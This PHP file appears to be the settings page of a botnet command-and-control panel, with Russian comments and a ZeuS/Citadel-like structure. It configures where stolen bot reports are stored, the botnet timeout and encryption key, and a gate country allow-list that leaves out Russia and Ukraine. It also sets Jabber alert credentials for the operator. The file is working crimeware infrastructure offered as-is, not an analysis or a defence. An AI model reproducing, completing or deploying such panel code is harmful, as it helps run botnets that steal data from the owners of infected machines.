<?php if(!defined('__CP__'))die();

define('INPUT_WIDTH', '300px');
$errors   = array();

array_merge(config_gefault_values(), $GLOBALS['config']); # feed the defaults!

///////////////////////////////////////////////////////////////////////////////////////////////////
// Обработка данных.
///////////////////////////////////////////////////////////////////////////////////////////////////

$is_post = strcmp($_SERVER['REQUEST_METHOD'], 'POST') === 0 ? true : false;

if(!isset($_POST['reports_path']))$reports_path = $config['reports_path'];
else
{
  if(($l = strlen($_POST['reports_path'])) < 1 || $l > 200)$errors[] = LNG_SYS_E1;
  $reports_path = $_POST['reports_path'];
}
$reports_path = trim(str_replace('\\', '/', trim($reports_path)), '/');

$reports_to_db = (isset($_POST['reports_to_db']) && $_POST['reports_to_db'] == 1) ? 1 : ($is_post ? 0 : $config['reports_to_db']);
$reports_to_fs = (isset($_POST['reports_to_fs']) && $_POST['reports_to_fs'] == 1) ? 1 : ($is_post ? 0 : $config['reports_to_fs']);

if(isset($_POST['botnet_timeout']) && is_numeric($_POST['botnet_timeout']))$botnet_timeout = (int)intval($_POST['botnet_timeout']);
else $botnet_timeout = (int)($config['botnet_timeout'] / 60);
if($botnet_timeout < 1 || $botnet_timeout > 9999)$errors[] = LNG_SYS_E2;

if(!isset($_POST['botnet_cryptkey']))$botnet_cryptkey = $config['botnet_cryptkey'];
else
{
  if(($l = strlen($_POST['botnet_cryptkey'])) < 1 || $l > 255)$errors[] = LNG_SYS_E3;
  $botnet_cryptkey = $_POST['botnet_cryptkey'];
}

$allowed_countries = array();
if (isset($_POST['allowed_countries']))
	$allowed_countries = (array)$_POST['allowed_countries'];

//Сохранение параметров.
if($is_post && count($errors) == 0)
{
  $updateList['reports_path']    = $reports_path;
  $updateList['reports_to_db']   = $reports_to_db ? 1 : 0;
  $updateList['reports_to_fs']   = $reports_to_fs ? 1 : 0;
  $updateList['reports_geoip']   = (int)!empty($_REQUEST['reports_geoip']);
  $updateList['botnet_timeout']  = $botnet_timeout * 60;
  $updateList['botnet_cryptkey'] = $botnet_cryptkey;
  $updateList['allowed_countries'] = implode(',', $allowed_countries);
  $updateList['allowed_countries_enabled'] = isset($_POST['allowed_countries_enabled'])? 1 : 0;
  
  $updateList['reports_deduplication'] = isset($_POST['reports_deduplication'])? 1 : 0;

	$updateList['jabber'] = $_POST['jabber'];
	$e = explode(':', $updateList['jabber']['host'], 2);
	if (!isset($e[1])) $e[1] = 5222;
	list($updateList['jabber']['host'], $updateList['jabber']['port']) = $e;
  
  if(!updateConfig($updateList))$errors[] = LNG_SYS_E4;
  else
  {
    createDir($reports_path);
    header('Location: '.QUERY_STRING.'&u=1');
    die();
  }
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Вывод.
///////////////////////////////////////////////////////////////////////////////////////////////////

ThemeBegin(LNG_SYS, 0, 0, 0);

//Вывод ошибок.
if(count($errors) > 0)
{
  echo THEME_STRING_FORM_ERROR_1_BEGIN;
  foreach($errors as $r)echo $r.THEME_STRING_NEWLINE;
  echo THEME_STRING_FORM_ERROR_1_END;
}
//Вывод сообщений.
else if(isset($_GET['u']))
{
  echo THEME_STRING_FORM_SUCCESS_1_BEGIN.LNG_SYS_UPDATED.THEME_STRING_NEWLINE.THEME_STRING_FORM_SUCCESS_1_END;
}

//Вывод формы.
echo
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('options', QUERY_STRING_HTML, ''), THEME_FORMPOST_BEGIN),
str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).  
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_SYS_REPORTS), THEME_DIALOG_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_SYS_REPORTS_PATH, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('reports_path', htmlEntitiesEx($reports_path), 200, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', THEME_STRING_SPACE, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{TEXT}'), array(1, 'reports_to_db', 1, '', LNG_SYS_REPORTS_TODB), $reports_to_db ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', THEME_STRING_SPACE, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{TEXT}'), array(1, 'reports_to_fs', 1, '', LNG_SYS_REPORTS_TOFS), $reports_to_fs ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
      THEME_DIALOG_ROW_END.

		'<tr>',
			'<td></td>',
			'<td>', '<label><input type="checkbox" name="reports_geoip" value="1" ', empty($GLOBALS['config']['reports_geoip'])? '' : 'checked', '/> ',
						LNG_SYS_REPORTS_GEOIP, '</label>',
					'</td>',
			'</tr>',

      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_SYS_BOTNET), THEME_DIALOG_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_SYS_BOTNET_TIMEOUT, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('botnet_timeout', htmlEntitiesEx($botnet_timeout), 4, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_SYS_BOTNET_CRYPTKEY, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('botnet_cryptkey', htmlEntitiesEx($botnet_cryptkey), 255, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END;
      
	if (file_exists('system/gate/gate.plugin.404.php')){
			$title = LNG_SYS_ALLOWED_COUNTRIES . ' ';
			$title .= ' <label> '.
					'<input type="checkbox" name="allowed_countries_enabled" value="1" '. (empty($config['allowed_countries_enabled'])? '' : 'checked') .' /> '.
					LNG_SYS_ALLOWED_COUNTRIES_ENABLED.
					'</label>';
			
			echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, $title), THEME_DIALOG_TITLE).
			THEME_DIALOG_ROW_BEGIN;
	 
			/* allowed countries */
			$countries = array('--' => 'Unknown');
			$R = mysql_query('SELECT `c`, `country` FROM `ipv4toc` GROUP BY `c` ORDER BY `c` ASC;');
			while ($R && !is_bool($r = mysql_fetch_row($R)))
				if (!in_array($r[0], array('RU','UA')))
					$countries[  $r[0]  ] = $r[1];

			$allowed_countries = isset($config['allowed_countries'])
					? explode(',', $config['allowed_countries'])
					: array_keys($countries);
			
			echo '<tr><td colspan=2><table id="allowed_countries" class="disabled"><tr><td>';
			$col_count = 12;
			$per_col = floor( count($countries)/$col_count );
			if ($per_col==0) $per_col = 1;
			$i=0;
			foreach ($countries as $cnt => $country){
				if ($i++ % $per_col == 0 && $i != 0)
					echo '</td><td>';
				echo '<label title="'.$country.'">',
					'<input type="checkbox" name="allowed_countries[]" value="'.$cnt.'" ', 
							in_array($cnt, $allowed_countries)? ' checked':'',
							'/> ', $cnt,
					'</label><br>';
				}
			
			echo '<tr><td colspan="', $col_count, '">',
					'<div class="massive_checkbox_control" data-target="#allowed_countries input:checkbox" />',
						'<a href="#" data-action="all">All</a>', ' / ',
						'<a href="#" data-action="inv">Inv</a>', ' / ',
						'<a href="#" data-action="none">None</a>',
						'</div>',
					'</td>',
				'</tr>'
				;
			
			echo '</td></tr></table>';
			
			echo '</td></tr>';
			
		echo  THEME_DIALOG_ROW_END;
		}
	
	/* Deduplication */
		if (file_exists('system/cron/reports_dedup.php')){
			echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_SYS_FEATURES), THEME_DIALOG_TITLE).
			THEME_DIALOG_ROW_BEGIN;
			echo '<tr><td colspan=2>';

			echo '<ul>',
				'<li>',
					'<label>',
						'<input type="checkbox" name="reports_deduplication" value="1" ',
							empty($config['reports_deduplication'])?'':'checked' ,'/> ',
						LNG_SYS_FEATURES_REPORTS_DEDUPLICATION,
						'</label>',
					'</li>',
				'</ul>';

			echo '</td></tr>';
			echo THEME_DIALOG_ROW_END;
			}

	/* Jabber */
		$hostport = empty($config['jabber']['host'])? '' : ($config['jabber']['host'].':'.$config['jabber']['port']);
		echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_SYS_JABBER_BOT), THEME_DIALOG_TITLE).THEME_DIALOG_ROW_BEGIN;
		echo '<tr>',
				'<td>', LNG_SYS_JABBER_BOT_HOST,'</td>',
				'<td><input type="text" name="jabber[host]" value="', $hostport, '" placeholder="jabber.org:5222" SIZE=40 /></th>',
				'</tr>';
		echo '<tr>',
				'<td>', LNG_SYS_JABBER_BOT_USER,'</td>',
				'<td><input type="text" name="jabber[login]" value="', $config['jabber']['login'], '" placeholder="username" SIZE=40 /></th>',
				'</tr>';
		echo '<tr>',
				'<td>', LNG_SYS_JABBER_BOT_PASS,'</td>',
				'<td><input type="text" name="jabber[pass]" value="', $config['jabber']['pass'], '" SIZE=40 /></th>',
				'</tr>';
		echo THEME_DIALOG_ROW_END;
	
echo      
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END.
  str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
    str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_SYS_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
  THEME_DIALOG_ACTIONLIST_END.
THEME_DIALOG_END.
THEME_FORMPOST_END;

ThemeEnd();
?>
<script src="theme/js/ajax_forms.js"></script>
<script src="theme/js/page-sys_options.js"></script>
